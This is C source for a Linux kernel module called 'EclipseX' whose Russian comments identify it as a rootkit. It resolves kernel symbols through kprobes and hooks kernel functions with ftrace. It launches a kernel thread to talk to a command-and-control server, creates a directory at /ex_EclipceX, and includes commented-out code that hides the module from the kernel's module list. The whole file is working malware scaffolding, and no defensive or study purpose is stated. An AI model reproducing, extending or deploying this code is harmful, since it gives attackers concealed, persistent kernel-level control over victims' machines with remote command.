#define pr_fmt(fmt) "EclipseX: " fmt

#include <linux/kallsyms.h>
#include <linux/kernel.h>
// #include <linux/slab.h>			// работа с памятью (выделение освободждение и тп)
// #include <linux/uaccess.h>		// взаимодействие с пространством пользователя
#include <linux/kprobes.h>
#include <linux/version.h>
#include <linux/module.h>

#include <linux/namei.h> // для создания директории
#include <linux/mount.h>    // for mnt_idmap

#include <linux/kthread.h>   // kthread API


#include "src/hooks.h"
#include "src/c2/conn_serv.h"


MODULE_LICENSE("GPL");

int debug_lvl = 0;
module_param(debug_lvl, int, 0600);
MODULE_PARM_DESC(debug_lvl, "Debug level 0/1");

int fh_install_hook(struct ftrace_hook *hook);
void fh_remove_hook(struct ftrace_hook *hook);
int fh_install_hooks(struct ftrace_hook *hooks, size_t count);
void fh_remove_hooks(struct ftrace_hook *hooks, size_t count);

// Функция поиска адреса системной функции
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
static unsigned long lookup_name(const char *name)
{
	struct kprobe kp = {
		.symbol_name = name
	};
	unsigned long retval;

	if (register_kprobe(&kp) < 0) {
		pr_info("error lookup_name register_kprobe\n");
		return 0;
	}

	retval = (unsigned long) kp.addr;

	unregister_kprobe(&kp);

	return retval;
}
#else
static unsigned long lookup_name(const char *name)
{
	return kallsyms_lookup_name(name);
}
#endif

#if LINUX_VERSION_CODE < KERNEL_VERSION(5,11,0)
#define FTRACE_OPS_FL_RECURSION FTRACE_OPS_FL_RECURSION_SAFE
#endif

#if LINUX_VERSION_CODE < KERNEL_VERSION(5,11,0)
#define ftrace_regs pt_regs

static __always_inline struct pt_regs *ftrace_get_regs(struct ftrace_regs *fregs)
{
	return fregs;
}
#endif

/*
 * 2 метода предотвращения рекурсии:
 * - По адресу возврата функции (USE_FENTRY_OFFSET = 0)
 * - Пропускает вызов ftrace (USE_FENTRY_OFFSET = 1)
 */
#define USE_FENTRY_OFFSET 0

static int fh_resolve_hook_address(struct ftrace_hook *hook)
{
	hook->address = lookup_name(hook->name);

	if (!hook->address) {
		pr_debug("unresolved symbol: %s\n", hook->name);
		return -ENOENT;
	}

#if USE_FENTRY_OFFSET
	*((unsigned long*) hook->original) = hook->address + MCOUNT_INSN_SIZE;
#else
	*((unsigned long*) hook->original) = hook->address;
#endif

	return 0;
}

static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip,
		struct ftrace_ops *ops, struct ftrace_regs *fregs)
{
	struct pt_regs *regs = ftrace_get_regs(fregs);
	struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

#if USE_FENTRY_OFFSET
	regs->ip = (unsigned long)hook->function;
#else
	if (!within_module(parent_ip, THIS_MODULE))
		regs->ip = (unsigned long)hook->function;
#endif
}

// Функция установки хука
int fh_install_hook(struct ftrace_hook *hook)
{
	int err;

	err = fh_resolve_hook_address(hook);
	if (err)
		return err;

	hook->ops.func = fh_ftrace_thunk;
	hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
	                | FTRACE_OPS_FL_RECURSION
	                | FTRACE_OPS_FL_IPMODIFY;

	err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
	if (err) {
		pr_debug("ftrace_set_filter_ip() failed: %d\n", err);
		return err;
	}

	err = register_ftrace_function(&hook->ops);
	if (err) {
		pr_debug("register_ftrace_function() failed: %d\n", err);
		ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
		return err;
	}
	
    pr_info("hook install %s\n", hook->name);

	return 0;
}

// Функция удаления хука
void fh_remove_hook(struct ftrace_hook *hook)
{
	int err;

	err = unregister_ftrace_function(&hook->ops);
	if (err) {
		pr_debug("unregister_ftrace_function() failed: %d\n", err);
	}

	err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
	if (err) {
		pr_debug("ftrace_set_filter_ip() failed: %d\n", err);
	}
}

// Функция установки хуков
int fh_install_hooks(struct ftrace_hook *hooks, size_t count)
{
	int err;
	size_t i;

	for (i = 0; i < count; i++) {
		err = fh_install_hook(&hooks[i]);
		if (err)
			goto error;
	}

	return 0;

error:

	while (i != 0) {
		fh_remove_hook(&hooks[--i]);
	}

	return err;
}

// Функция удаления хуков
void fh_remove_hooks(struct ftrace_hook *hooks, size_t count)
{
	size_t i;

	for (i = 0; i < count; i++)
		fh_remove_hook(&hooks[i]);
}

// на подумать
#ifndef CONFIG_X86_64
#error Currently only x86_64 architecture is supported
#endif

// Отключение оптимизации для корректного обнаружения рекурсии
#if !USE_FENTRY_OFFSET
#pragma GCC optimize("-fno-optimize-sibling-calls")
#endif

// создание диркетории и файлов вынести в отдельный файл 
// создание дир 1 - путь родительской дир, 2 - название новой дир

bool create_ex_dir(char *path, char *dir_name);
// !!! изменить структуру 
// Создать директорию под руткит
bool create_ex_dir(char *path, char *dir_name) {
	struct path parent_path;
    struct dentry *dentry;
    struct mnt_idmap *idmap;
    int err;

	// Получаем путь к родительской директории
    err = kern_path(path, LOOKUP_DIRECTORY, &parent_path);
    if (err)
        return false;

	// Ищем директорию по имени в родительской директории
    dentry = lookup_one_len(dir_name, parent_path.dentry, strlen(dir_name));
    if (IS_ERR(dentry)) {
        path_put(&parent_path);
        return false;
    }

	// Проверяем, существует ли уже такая директория
    if (dentry->d_inode) {
        // Если inode уже существует, значит, директория уже есть
        pr_info("Directory %s already exists in %s\n", dir_name, path);
        dput(dentry);
        path_put(&parent_path);
        return true;  // Возвращаем 0, потому что директория уже существует
    }

    idmap = mnt_idmap(parent_path.mnt);  // получаем idmap для текущего mount namespace

    if (vfs_mkdir(idmap, d_inode(parent_path.dentry), dentry, 0755)) {
		dput(dentry);
		path_put(&parent_path);
		return false;
	}

	pr_info("Directory %s was created in %s\n", dir_name, path);
    dput(dentry);
    path_put(&parent_path);
    return true;
}


static struct task_struct *c2_thread_ts;  // Указатель на поток

static int ex_init(void)
{
	int err;
    pr_info("module init\n");

	// скрыть модуль
	// list_del(&THIS_MODULE->list);

	// Установка хуков
	err = fh_install_hooks(EX_hooks, ARRAY_SIZE(EX_hooks));
	if (err)
		return err;


    // Создание потока под взаимодействие с сервером 
    c2_thread_ts = kthread_run(c2_thread, NULL, "c2_thread");

	if (create_ex_dir("/", "ex_EclipceX")) {
		create_ex_dir("/ex_EclipceX", "conf");
	}

	pr_info("module loaded\n");

	return 0;
}

static void ex_exit(void)
{
    pr_info("module exit\n");

	// скрытие модуля
	// list_add(&THIS_MODULE->list, prev_module);
    // hidden = 0;

	// Удаление хуков
	fh_remove_hooks(EX_hooks, ARRAY_SIZE(EX_hooks));

	// Завершение потока
    if (c2_thread_ts) {
        pr_info("остановка потока...\n");
        kthread_stop(c2_thread_ts);
    }

	pr_info("module unloaded\n");
}

module_init(ex_init);
module_exit(ex_exit);